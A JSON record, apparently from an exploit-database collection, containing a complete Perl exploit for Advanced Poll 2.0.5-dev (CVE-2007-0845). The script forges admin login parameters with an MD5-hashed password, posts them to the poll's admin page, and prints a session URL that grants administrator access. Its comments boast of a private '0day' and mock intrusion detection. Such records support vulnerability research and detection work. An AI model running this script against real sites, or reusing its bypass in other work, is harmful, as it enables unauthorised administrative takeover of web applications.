{
  "id": "3282",
  "title": "Advanced Poll 2.0.5-dev - Remote Admin Session Generator",
  "cve": "CVE-2007-0845",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n# Advanced Poll 2.0.0 >= 2.0.5-dev textfile admin session gen.\r\n#\r\n# \r\n# 0day!  KEEP IT PRIVATE  0day!\r\n# \r\n# date: 30/07/06\r\n# \r\n# diwou <diwou@phucksys.org>\r\n#\r\n# PHCKSEC (c) 2001-2006.\r\n#\r\n# see templates for code execution ;).\r\n\r\nuse strict;\r\nuse warnings;\r\nuse LWP::UserAgent;\r\nuse MD5;\r\n\r\nmy ($lwp,$agent,$out,$url,$proxy)=(undef,undef,undef,$ARGV[0],$ARGV[1]);\r\nmy %zday=\r\n(\r\n\tusername => 'jakahw4nk4h',\r\n\t'pollvars[poll_username]' => 'jakahw4nk4h',\r\n\tpassword => 'fuckoff',\r\n\t'pollvars[poll_password]' => ''\r\n);\r\n$zday{'pollvars[poll_password]'}=&md5($zday{password});\r\n$agent=\"Hey IDS! i'm gonna fuck your advanced poll right? B===D\"; # post method doesnt log it, so doesnt matter.\r\n#$agent=\"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1\";\r\n\r\n#\r\n# args: url proxy(optional)\r\n# \r\n# url: http|https://tatget:(port)/phppoll/\r\n# proxy: http|https://hostname:(port)/\r\n#\r\ndie(\"RTFC! ;)\") unless(@ARGV);\r\n\r\n# some lwp routines...\r\n$lwp=new LWP::UserAgent();\r\n$lwp->agent($agent);\r\n$lwp->timeout(10);\r\n$lwp->protocols_allowed(['http','https']);\r\n$lwp->proxy(['http','https'],$proxy) if(@ARGV>1);\r\n\r\n$url.=\"/\" if($url!~/\\/$/);\r\n$url.=\"admin/index.php\";\r\nprint \"Using proxy \".$proxy.\"\\n\" if($proxy);\r\nprint \"Doing some pretty with \".$url.\"...\\n\\n\";\r\n\r\n$out=$lwp->post($url,\\%zday)->content();\r\nif($out=~ /index\\.php\\?session=((.){32})/)\r\n{\r\n\tprint \"well, you are a bigone ;).\\n\";\r\n\tprint \"try: \".$url.\"?session=\".$1.\"&uid=1\\n\";\r\n}\r\nelse\r\n{\r\n\tprint \"don't worry, u can improve me! eh eh eh :D?\\n\";\r\n}\r\n\r\nsub md5\r\n{\r\n\t$_=new MD5;\r\n\t$_->add(@_);\r\n\treturn unpack(\"H*\",$_->digest());\r\n}\r\n\r\n# milw0rm.com [2007-02-07]",
  "url": "https://www.exploit-db.com/exploits/3282"
}